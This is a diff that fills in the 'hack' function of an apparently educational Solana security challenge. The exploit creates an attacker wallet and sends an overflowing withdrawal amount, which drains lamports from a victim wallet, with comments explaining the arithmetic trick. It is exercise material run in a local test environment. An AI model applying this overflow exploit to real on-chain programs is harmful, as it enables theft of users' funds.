@@ -10,8 +10,12 @@ use solana_program::native_token::lamports_to_sol;
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 // need to pull these in
-use solana_program::instruction::{AccountMeta, Instruction};
-use borsh::{BorshSerialize};
+use borsh::BorshSerialize;
+use solana_program::{
+    instruction::{AccountMeta, Instruction},
+    rent::Rent,
+    sysvar,
+};
 
 struct Challenge {
     hacker: Keypair,
@@ -21,7 +25,69 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+    /* Wallet is authorized now => can only withdraw from our wallet.
+     * But as any wallet is owned by the contract, the lamports can be reduced by anyone wallet through overflows
+     * we want to benefit from overflow => create hacker wallet
+     * withdraw an overflow amount from hacker wallet (+) to victim wallet (-)
+     */
+    // create hackers wallet
+    assert_tx_success(_env.execute_as_transaction(
+        &[level2::initialize(
+            _challenge.wallet_program,
+            _challenge.hacker.pubkey(),
+        )],
+        &[&_challenge.hacker],
+    ));
+    let hacker_wallet = level2::get_wallet_address(_challenge.hacker.pubkey(), _challenge.wallet_program);
+
+    // need to pass min_balance + amount <= hacker_wallet.lamports = 0
+    // i.e. min_balance + amount = 0 (RHS cannot be overflowed)
+    // i.e. set amount = -min_balance
+    let min_balance = Rent::default().minimum_balance(8);
+    println!("Min balance: {}", min_balance);
+    let overflow = (-(min_balance as i64)) as u64;
+    println!("Overflow amount: {}", overflow);
+    let mut hacker_profit: u64 = _env.get_account(hacker_wallet).unwrap().lamports;
+
+    // move funds to our wallet
+    let tx = _env.execute_as_transaction(
+        &[Instruction {
+            program_id: _challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false), // wallet_info
+                AccountMeta::new(_challenge.hacker.pubkey(), true), // authority
+                AccountMeta::new(_challenge.wallet_address, false), // destination
+                AccountMeta::new_readonly(sysvar::rent::id(), false),
+            ],
+            data: level2::WalletInstruction::Withdraw { amount: overflow }
+                .try_to_vec()
+                .unwrap(),
+        }],
+        &[&_challenge.hacker],
+    );
+    tx.print_named("Hack: hacker overflow");
+
+    // withdraw from our wallet
+    hacker_profit = _env.get_account(hacker_wallet).unwrap().lamports - hacker_profit;
+    println!("Hacker profit: {}", hacker_profit);
+    let tx = _env.execute_as_transaction(
+        &[Instruction {
+            program_id: _challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false),
+                AccountMeta::new(_challenge.hacker.pubkey(), true),
+                AccountMeta::new(_challenge.hacker.pubkey(), false),
+                AccountMeta::new_readonly(sysvar::rent::id(), false),
+            ],
+            data: level2::WalletInstruction::Withdraw { amount: 1 }
+                .try_to_vec()
+                .unwrap(),
+        }],
+        &[&_challenge.hacker],
+    );
+    tx.print_named("Hack: hacker withdraw");
+}
 
 /*
 SETUP CODE BELOW
